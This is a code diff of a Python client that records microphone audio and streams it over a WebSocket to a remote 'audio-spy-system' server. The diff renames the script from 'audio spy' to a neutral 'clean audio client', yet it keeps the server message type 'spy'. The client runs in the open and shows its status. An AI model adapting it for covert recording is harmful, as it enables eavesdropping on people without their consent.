@@ -1,7 +1,7 @@
 # -*- coding: utf-8 -*-
 """
-РАБОЧИЙ АУДИО ШПИОН - гарантированная передача звука
-Использует проверенные библиотеки и правильный формат
+АУДИО КЛИЕНТ С ЧИСТЫМ ЗВУКОМ
+Без треска и искажений
 """
 import asyncio
 import websockets
@@ -9,427 +9,303 @@ import json
 import base64
 import time
 import sys
-import threading
-from queue import Queue
-import signal
 import numpy as np
+import sounddevice as sd
+from queue import Queue
+import threading
+import struct
 
 # ========== НАСТРОЙКИ ==========
 SERVER_URL = "wss://audio-spy-system.onrender.com/ws"
-SAMPLE_RATE = 44100  # ИСПРАВЛЕНО: 44.1 кГц для совместимости с веб-аудио
-CHUNK_SIZE = 1024    # Маленькие чанки для низкой задержки
-AUDIO_FORMAT = 'int16'
+SAMPLE_RATE = 16000  # 16 kHz - оптимально для голоса
+CHUNK_SIZE = 1024    # Размер чанка
+BUFFER_SIZE = 50     # Размер буфера
+DEVICE_ID = None     # None = устройство по умолчанию
 
-class PerfectAudioSpy:
+class CleanAudioClient:
     def __init__(self):
         self.running = True
         self.ws = None
-        self.audio_queue = Queue(maxsize=100)
+        self.audio_queue = Queue(maxsize=BUFFER_SIZE)
         self.packet_count = 0
-        self.audio_stats = {'min': 0, 'max': 0, 'avg': 0}
-        self.stream = None  # Аудио поток
+        self.stream = None
+        self.lock = threading.Lock()
         
-    def print_header(self):
+    def print_info(self):
         """Информация о программе"""
         print("\n" + "="*60)
-        print("🎤 PERFECT AUDIO SPY - ГАРАНТИРОВАННАЯ РАБОТА")
+        print("🎤 AUDIO STREAM CLIENT - ЧИСТЫЙ ЗВУК")
         print("="*60)
         print(f"Сервер: {SERVER_URL}")
-        print(f"Частота: {SAMPLE_RATE} Гц | Формат: {AUDIO_FORMAT}")
-        print(f"Размер чанка: {CHUNK_SIZE} сэмплов")
-        print("="*60 + "\n")
+        print(f"Частота: {SAMPLE_RATE} Hz")
+        print(f"Чанк: {CHUNK_SIZE} samples")
+        print("="*60)
     
-    async def connect(self):
-        """Улучшенное подключение"""
-        print("🔗 Установка соединения...")
-        retry_count = 0
-        max_retries = 5
+    async def connect_to_server(self):
+        """Подключение к WebSocket серверу"""
+        print("🔗 Подключение к серверу...")
         
-        while retry_count < max_retries and self.running:
-            try:
-                # Простое подключение без лишних параметров
-                self.ws = await websockets.connect(
-                    SERVER_URL,
-                    ping_interval=20,
-                    ping_timeout=10,
-                    close_timeout=1
-                )
-                
-                # Отправляем настройки аудио
-                await self.ws.send(json.dumps({
-                    "type": "spy",
-                    "audio_config": {
-                        "sample_rate": SAMPLE_RATE,
-                        "channels": 1,
-                        "format": AUDIO_FORMAT,
-                        "chunk_size": CHUNK_SIZE
-                    },
-                    "timestamp": time.time(),
-                    "device": "python_client"
-                }))
-                
-                print("✅ Соединение установлено")
-                return True
-                
-            except Exception as e:
-                print(f"❌ Ошибка соединения: {str(e)}")
-                retry_count += 1
-                if retry_count < max_retries:
-                    print(f"♻️  Повторная попытка через 3 секунды... ({retry_count}/{max_retries})")
-                    await asyncio.sleep(3)
-        
-        return False
-    
-    def list_audio_devices(self):
-        """Показать все аудио устройства"""
         try:
-            import sounddevice as sd
+            self.ws = await websockets.connect(
+                SERVER_URL,
+                ping_interval=None,
+                ping_timeout=None,
+                max_size=None
+            )
+            
+            # Отправляем конфигурацию
+            await self.ws.send(json.dumps({
+                "type": "spy",
+                "sample_rate": SAMPLE_RATE,
+                "channels": 1,
+                "chunk": CHUNK_SIZE
+            }))
+            
+            print("✅ Подключено!")
+            return True
+            
+        except Exception as e:
+            print(f"❌ Ошибка подключения: {e}")
+            return False
+    
+    def setup_audio_device(self):
+        """Настройка и выбор аудио устройства"""
+        try:
+            print("\n📊 Поиск аудио устройств...")
             devices = sd.query_devices()
             
-            print("\n📊 ДОСТУПНЫЕ АУДИО УСТРОЙСТВА:")
-            print("-" * 60)
-            
+            # Ищем устройства ввода
             input_devices = []
             for i, dev in enumerate(devices):
                 if dev['max_input_channels'] > 0:
-                    input_devices.append((i, dev))
-                    print(f"[{i}] {dev['name']}")
-                    print(f"    Каналы: {dev['max_input_channels']} | "
-                          f"Частота: {dev['default_samplerate']} Гц")
-                    print(f"    ID: {dev['index']} | "
-                          f"Тип: {dev.get('hostapi', 'Unknown')}")
-                    print()
+                    input_devices.append((i, dev['name']))
             
             if not input_devices:
-                print("❌ Не найдено ни одного входного аудио устройства!")
-                return -1
+                print("❌ Не найдены микрофоны!")
+                return False
             
-            # Автоматически выбираем первое доступное устройство
-            default_device = input_devices[0][0]
-            print(f"🔄 Автоматически выбрано устройство [{default_device}]")
-            return default_device
+            print("Доступные микрофоны:")
+            for idx, name in input_devices:
+                print(f"  [{idx}] {name}")
             
-        except ImportError:
-            print("❌ SoundDevice не установлен!")
-            print("   Установите: pip install sounddevice")
-            return -1
+            # Используем устройство по умолчанию
+            default_idx = sd.default.device[0]
+            print(f"\n🔄 Используется устройство по умолчанию: [{default_idx}]")
+            
+            return True
+            
         except Exception as e:
-            print(f"❌ Ошибка при поиске устройств: {e}")
-            return -1
+            print(f"⚠️  Ошибка поиска устройств: {e}")
+            return True  # Продолжаем с устройством по умолчанию
     
-    def capture_audio_simple(self, device_id=None):
+    def audio_callback(self, indata, frames, time_info, status):
         """
-        Простой и надежный захват аудио
+        Callback для захвата аудио
+        ВАЖНО: Эта функция вызывается в отдельном потоке от аудио драйвера!
         """
+        if status:
+            print(f"Audio status: {status}")
+        
         try:
-            import sounddevice as sd
+            # Берем данные
+            audio_float32 = indata.copy().flatten()
             
-            print("🎤 Запуск захвата аудио...")
+            # Фильтр для удаления шума (простой high-pass)
+            # Убираем постоянную составляющую
+            audio_float32 = audio_float32 - np.mean(audio_float32)
             
-            # Если device_id не указан, используем устройство по умолчанию
-            if device_id is None:
-                device_id = sd.default.device[0]  # Входное устройство по умолчанию
+            # Нормализация (предотвращение клиппинга)
+            max_val = np.max(np.abs(audio_float32))
+            if max_val > 0.9:  # Если близко к клиппингу
+                audio_float32 = audio_float32 * 0.9 / max_val
             
-            print(f"📱 Используемое устройство: {device_id}")
+            # Конвертация float32 -> int16
+            audio_int16 = np.clip(audio_float32 * 32767, -32768, 32767).astype(np.int16)
             
-            def audio_callback(indata, frames, time_info, status):
-                """Колбек для получения аудио"""
-                if status:
-                    if status.input_overflow:
-                        print("⚠️  Переполнение входного буфера!")
-                    else:
-                        print(f"Статус: {status}")
+            # Статистика для отладки
+            rms = np.sqrt(np.mean(audio_float32**2))
+            if rms > 0.01:  # Есть звук
+                level = int(rms * 50)
+                level = min(30, level)
+                bars = '█' * level
+                print(f"\r🔊 Уровень: [{bars:30}] {rms:.4f}", end="")
+            
+            # Добавляем в очередь если есть место
+            if not self.audio_queue.full():
+                audio_bytes = audio_int16.tobytes()
+                self.audio_queue.put(audio_bytes)
                 
-                try:
-                    # Получаем данные
-                    audio_data = indata.copy().flatten()
-                    
-                    # Проверяем, есть ли звук
-                    if np.abs(audio_data).max() < 0.001:  # Слишком тихо
-                        # Генерируем тестовый сигнал для проверки
-                        audio_data = np.sin(2 * np.pi * 440 * np.arange(len(audio_data)) / SAMPLE_RATE) * 0.01
-                    
-                    # Конвертируем float32 [-1, 1] в int16
-                    audio_int16 = (audio_data * 32767).astype(np.int16)
-                    
-                    # Обновляем статистику
-                    self.update_audio_stats(audio_int16)
-                    
-                    # Добавляем в очередь, если есть место
-                    if not self.audio_queue.full():
-                        self.audio_queue.put(audio_int16.tobytes())
-                    
-                except Exception as e:
-                    print(f"Ошибка в колбеке: {e}")
-            
-            # Настройки потока
-            kwargs = {
-                'callback': audio_callback,
+        except Exception as e:
+            print(f"\nОшибка в audio_callback: {e}")
+    
+    def start_audio_stream(self):
+        """Запуск потока захвата аудио"""
+        print("\n🎤 Запуск захвата звука...")
+        
+        try:
+            # Параметры потока
+            stream_params = {
+                'callback': self.audio_callback,
                 'channels': 1,
                 'samplerate': SAMPLE_RATE,
                 'blocksize': CHUNK_SIZE,
-                'dtype': 'float32'
+                'dtype': 'float32',
+                'latency': 'low'
             }
             
-            # Добавляем device_id, если он указан и валиден
-            if device_id is not None and device_id >= 0:
-                kwargs['device'] = device_id
+            # Если указано конкретное устройство
+            if DEVICE_ID is not None:
+                stream_params['device'] = DEVICE_ID
             
             # Создаем и запускаем поток
-            self.stream = sd.InputStream(**kwargs)
+            self.stream = sd.InputStream(**stream_params)
             self.stream.start()
             
             print("✅ Микрофон активирован")
-            print("💬 ГОВОРИТЕ В МИКРОФОН!")
-            print("   Должны видеть уровень звука ниже...")
-            
-            # Показываем уровень звука
-            while self.running and self.stream.active:
-                time.sleep(0.5)
-                self.show_audio_level()
-                
-            print("\n🛑 Захват аудио остановлен")
+            print("💬 Говорите теперь...")
+            return True
             
         except Exception as e:
-            print(f"❌ Ошибка захвата аудио: {str(e)}")
+            print(f"❌ Ошибка запуска микрофона: {e}")
             import traceback
             traceback.print_exc()
-            self.running = False
-    
-    def update_audio_stats(self, audio_data):
-        """Обновление статистики аудио"""
-        if len(audio_data) > 0:
-            self.audio_stats['min'] = np.min(audio_data)
-            self.audio_stats['max'] = np.max(audio_data)
-            self.audio_stats['avg'] = np.mean(np.abs(audio_data))
-    
-    def show_audio_level(self):
-        """Показать уровень звука в консоли"""
-        avg = self.audio_stats['avg']
-        if avg == 0:
-            print(f"\r🔇 Нет звука | Очередь: {self.audio_queue.qsize()} | Пакеты: {self.packet_count}     ", end="")
-            return
-            
-        level = int(avg / 1000)  # Преобразуем в 0-32
-        level = min(32, max(1, level))
-        
-        # Цветная визуализация
-        if level > 20:
-            color = "🟢"  # Зеленый - громко
-        elif level > 10:
-            color = "🟡"  # Желтый - нормально
-        elif level > 5:
-            color = "🟠"  # Оранжевый - тихо
-        else:
-            color = "🔴"  # Красный - очень тихо
-        
-        bars = "█" * level
-        spaces = " " * (32 - level)
-        print(f"\r{color} Уровень: [{bars}{spaces}] {avg:.0f} | Очередь: {self.audio_queue.qsize()} | Пакеты: {self.packet_count}     ", end="")
-    
-    async def send_audio_packets(self):
-        """Отправка аудио пакетов на сервер"""
-        print("\n📤 Начало передачи аудио...")
-        
-        start_time = time.time()
-        last_stats_time = time.time()
-        
-        while self.running and self.ws and not self.ws.closed:
-            try:
-                # Пытаемся получить данные из очереди
-                try:
-                    audio_data = self.audio_queue.get(timeout=0.1)
-                except:
-                    # Если очередь пуста, генерируем тишину
-                    silent_data = np.zeros(CHUNK_SIZE, dtype=np.int16)
-                    audio_data = silent_data.tobytes()
-                
-                # Проверяем что данные не пустые
-                if len(audio_data) < 100:
-                    continue
-                
-                # Кодируем в base64
-                encoded = base64.b64encode(audio_data).decode('utf-8')
-                
-                # Формируем пакет
-                packet = {
-                    "type": "audio",
-                    "data": encoded,
-                    "timestamp": time.time(),
-                    "packet_id": self.packet_count,
-                    "sample_rate": SAMPLE_RATE,
-                    "channels": 1,
-                    "format": AUDIO_FORMAT,
-                    "size": len(audio_data)
-                }
-                
-                # Отправляем
-                if not self.ws.closed:
-                    await self.ws.send(json.dumps(packet))
-                
-                self.packet_count += 1
-                
-                # Показываем статистику каждые 2 секунды
-                current_time = time.time()
-                if current_time - last_stats_time > 2:
-                    elapsed = current_time - start_time
-                    if elapsed > 0:
-                        speed = self.packet_count / elapsed
-                        qsize = self.audio_queue.qsize()
-                        print(f"\n📦 Пакетов: {self.packet_count} | "
-                              f"Скорость: {speed:.1f}/сек | "
-                              f"Очередь: {qsize} | "
-                              f"Время: {elapsed:.0f}с")
-                    last_stats_time = current_time
-                
-            except websockets.exceptions.ConnectionClosed:
-                print("\n⚠️  Соединение закрыто сервером")
-                break
-            except Exception as e:
-                if "timeout" not in str(e):
-                    print(f"\n⚠️  Ошибка отправки: {str(e)[:50]}")
-                await asyncio.sleep(0.1)
-        
-        print("\n⏹️  Передача остановлена")
-    
-    async def test_microphone(self):
-        """Быстрый тест микрофона"""
-        print("\n🎤 ТЕСТ МИКРОФОНА")
-        print("Говорите что-нибудь в течение 3 секунд...")
-        
-        try:
-            import sounddevice as sd
-            
-            # Записываем 3 секунды
-            duration = 3
-            recording = sd.rec(
-                int(duration * SAMPLE_RATE),
-                samplerate=SAMPLE_RATE,
-                channels=1,
-                dtype='float32'
-            )
-            
-            # Анимация
-            for i in range(duration):
-                print(f"\rЗапись: {i+1}/{duration} сек {'█' * (i+1)}{' ' * (duration-i-1)}", end="")
-                await asyncio.sleep(1)
-            
-            print("\n\n📊 Анализ записи...")
-            
-            # Анализ
-            audio_data = recording.flatten()
-            rms = np.sqrt(np.mean(audio_data**2))
-            peak = np.max(np.abs(audio_data))
-            
-            print(f"  • RMS уровень: {rms:.4f}")
-            print(f"  • Пиковый уровень: {peak:.4f}")
-            
-            if rms > 0.005:
-                print("✅ Микрофон работает нормально")
-                return True
-            else:
-                print("❌ Проблема: Нет звука или очень тихо")
-                print("   Проверьте:")
-                print("   1. Микрофон подключен")
-                print("   2. Микрофон выбран как устройство по умолчанию")
-                print("   3. Уровень громкости микрофона")
-                return False
-                
-        except Exception as e:
-            print(f"❌ Ошибка теста: {str(e)}")
             return False
     
-    async def run_simple_mode(self):
-        """Простой режим работы"""
-        # Сначала показываем устройства
-        device_id = self.list_audio_devices()
+    async def send_audio_data(self):
+        """Отправка аудио данных на сервер"""
+        print("\n📤 Начало передачи...")
         
-        if device_id == -1:
-            print("❌ Не удалось найти аудио устройства")
-            return
+        send_interval = CHUNK_SIZE / SAMPLE_RATE  # Интервал между отправками
+        last_send_time = time.time()
         
-        # Тест микрофона
-        if not await self.test_microphone():
-            print("\n⚠️  Проблема с микрофоном, но продолжаем...")
-        
-        # Подключаемся к серверу
-        if not await self.connect():
-            print("❌ Не удалось подключиться к серверу")
-            return
-        
-        print("\n" + "="*60)
-        print("🚀 НАЧАЛО ТРАНСЛЯЦИИ АУДИО")
-        print("="*60)
-        print("Нажмите Ctrl+C для остановки\n")
-        
-        # Запускаем захват в отдельном потоке
-        capture_thread = threading.Thread(
-            target=self.capture_audio_simple,
-            args=(device_id,),
-            daemon=True
-        )
-        capture_thread.start()
-        
-        # Ждем инициализации микрофона
-        await asyncio.sleep(2)
-        
-        # Запускаем отправку
-        try:
-            await self.send_audio_packets()
-        except KeyboardInterrupt:
-            print("\n\n⏹️  Остановка по запросу пользователя")
-        except Exception as e:
-            print(f"\n💥 Ошибка: {e}")
-        finally:
-            self.running = False
-            if self.stream:
-                self.stream.stop()
-                self.stream.close()
+        while self.running:
+            try:
+                # Проверяем время для синхронизации
+                current_time = time.time()
+                elapsed = current_time - last_send_time
+                
+                if elapsed < send_interval * 0.8:  # Не отправляем слишком часто
+                    await asyncio.sleep(0.001)
+                    continue
+                
+                # Получаем данные из очереди
+                try:
+                    audio_bytes = self.audio_queue.get_nowait()
+                except:
+                    # Очередь пуста - отправляем тишину
+                    audio_bytes = bytes(CHUNK_SIZE * 2)  # 2 байта на сэмпл (int16)
+                
+                # Создаем пакет
+                encoded_audio = base64.b64encode(audio_bytes).decode('ascii')
+                
+                packet = {
+                    "type": "audio",
+                    "data": encoded_audio,
+                    "timestamp": time.time(),
+                    "packet_id": self.packet_count,
+                    "sample_rate": SAMPLE_RATE
+                }
+                
+                # Отправляем пакет
+                await self.ws.send(json.dumps(packet))
+                
+                self.packet_count += 1
+                last_send_time = current_time
+                
+                # Показываем прогресс
+                if self.packet_count % 50 == 0:
+                    qsize = self.audio_queue.qsize()
+                    print(f"\n📦 Пакетов: {self.packet_count} | Очередь: {qsize}")
+                
+            except websockets.exceptions.ConnectionClosed:
+                print("\n⚠️  Соединение разорвано")
+                break
+            except Exception as e:
+                print(f"\n⚠️  Ошибка отправки: {e}")
+                await asyncio.sleep(0.1)
+    
+    async def monitor_connection(self):
+        """Мониторинг соединения"""
+        while self.running:
+            await asyncio.sleep(5)
+            if self.ws:
+                try:
+                    # Просто проверяем что соединение живо
+                    await self.ws.ping()
+                except:
+                    print("⚠️  Потеряно соединение с сервером")
+                    self.running = False
     
     async def run(self):
         """Основной цикл"""
-        self.print_header()
+        self.print_info()
+        
+        # Настройка аудио
+        if not self.setup_audio_device():
+            return
+        
+        # Подключение к серверу
+        if not await self.connect_to_server():
+            return
+        
+        # Запуск захвата звука
+        if not self.start_audio_stream():
+            return
+        
+        print("\n" + "="*60)
+        print("🚀 ТРАНСЛЯЦИЯ НАЧАТА")
+        print("Нажмите Ctrl+C для остановки")
+        print("="*60 + "\n")
         
         try:
-            await self.run_simple_mode()
+            # Запускаем задачи
+            send_task = asyncio.create_task(self.send_audio_data())
+            monitor_task = asyncio.create_task(self.monitor_connection())
+            
+            # Ждем завершения
+            await asyncio.gather(send_task, monitor_task)
+            
+        except KeyboardInterrupt:
+            print("\n\n⏹️  Остановка...")
         except Exception as e:
-            print(f"\n💥 Ошибка в основном цикле: {e}")
-            import traceback
-            traceback.print_exc()
+            print(f"\n💥 Ошибка: {e}")
+        finally:
+            self.cleanup()
+    
+    def cleanup(self):
+        """Очистка ресурсов"""
+        print("\n🧹 Очистка ресурсов...")
+        self.running = False
         
-        # Завершение
-        if self.ws and not self.ws.closed:
-            await self.ws.close()
-        
-        if self.stream and self.stream.active:
+        # Останавливаем аудио поток
+        if self.stream:
             self.stream.stop()
             self.stream.close()
+            print("✅ Аудио поток остановлен")
         
-        print(f"\n📊 ИТОГ: отправлено {self.packet_count} пакетов")
-        print("👋 Программа завершена\n")
+        # Закрываем WebSocket
+        if self.ws:
+            asyncio.create_task(self.ws.close())
+            print("✅ WebSocket закрыт")
+        
+        print(f"📊 Итог: отправлено {self.packet_count} пакетов")
+        print("👋 Завершено\n")
 
 def main():
-    """Запуск программы"""
+    """Точка входа"""
     # Настройки для Windows
     if sys.platform == "win32":
         asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())
     
-    # Обработка Ctrl+C
-    def signal_handler(sig, frame):
-        print("\n\n⏹️  Остановка по запросу пользователя")
-        sys.exit(0)
-    
-    signal.signal(signal.SIGINT, signal_handler)
-    
-    # Запуск
-    spy = PerfectAudioSpy()
+    # Запуск клиента
+    client = CleanAudioClient()
     
     try:
-        asyncio.run(spy.run())
+        asyncio.run(client.run())
     except KeyboardInterrupt:
-        print("\n\n👋 Программа завершена")
+        print("\n👋 Остановлено пользователем")
     except Exception as e:
-        print(f"\n💥 Критическая ошибка: {str(e)}")
+        print(f"\n💥 Критическая ошибка: {e}")
         import traceback
         traceback.print_exc()
 
